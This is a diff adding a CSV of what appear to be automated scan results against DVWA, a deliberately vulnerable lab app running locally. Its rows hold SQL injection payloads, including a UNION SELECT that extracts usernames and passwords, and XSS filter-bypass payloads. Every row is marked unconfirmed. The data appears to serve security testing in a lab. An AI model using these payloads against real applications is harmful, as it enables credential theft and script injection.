@@ -1,0 +1,13 @@
+target,url,param,vuln_type,technique,payload,confirmed,evidence
+dvwa,http://host.docker.internal:8080/vulnerabilities/sqli/,id,sqli,basic_quote_breakout,1' OR '1'='1,False,no_anomaly_detected
+dvwa,http://host.docker.internal:8080/vulnerabilities/sqli/,id,sqli,quote_free_bypass,1 OR 1=1,False,no_anomaly_detected
+dvwa,http://host.docker.internal:8080/vulnerabilities/sqli/,id,sqli,union_data_exfiltration,"1' UNION SELECT user, password FROM users #",False,no_anomaly_detected
+dvwa,http://host.docker.internal:8080/vulnerabilities/sqli/,id,sqli,logical_control_check,1' AND '1'='2,False,no_anomaly_detected
+dvwa,http://host.docker.internal:8080/vulnerabilities/sqli_blind/,id,sqli,basic_quote_breakout,1' OR '1'='1,False,no_anomaly_detected
+dvwa,http://host.docker.internal:8080/vulnerabilities/sqli_blind/,id,sqli,quote_free_bypass,1 OR 1=1,False,no_anomaly_detected
+dvwa,http://host.docker.internal:8080/vulnerabilities/sqli_blind/,id,sqli,union_data_exfiltration,"1' UNION SELECT user, password FROM users #",False,no_anomaly_detected
+dvwa,http://host.docker.internal:8080/vulnerabilities/sqli_blind/,id,sqli,logical_control_check,1' AND '1'='2,False,no_anomaly_detected
+dvwa,http://host.docker.internal:8080/vulnerabilities/xss_r/,name,xss,basic_script_tag,<script>alert('XSS')</script>,False,payload_not_found_or_escaped
+dvwa,http://host.docker.internal:8080/vulnerabilities/xss_r/,name,xss,nested_tag_bypass,<scr<script>ipt>alert('XSS')</scr<script>ipt>,False,payload_not_found_or_escaped
+dvwa,http://host.docker.internal:8080/vulnerabilities/xss_r/,name,xss,event_handler_bypass,<img src=x onerror=alert('XSS')>,False,payload_not_found_or_escaped
+dvwa,http://host.docker.internal:8080/vulnerabilities/xss_r/,name,xss,iframe_javascript_uri,"<iframe src=""javascript:alert('XSS')"">",False,payload_not_found_or_escaped
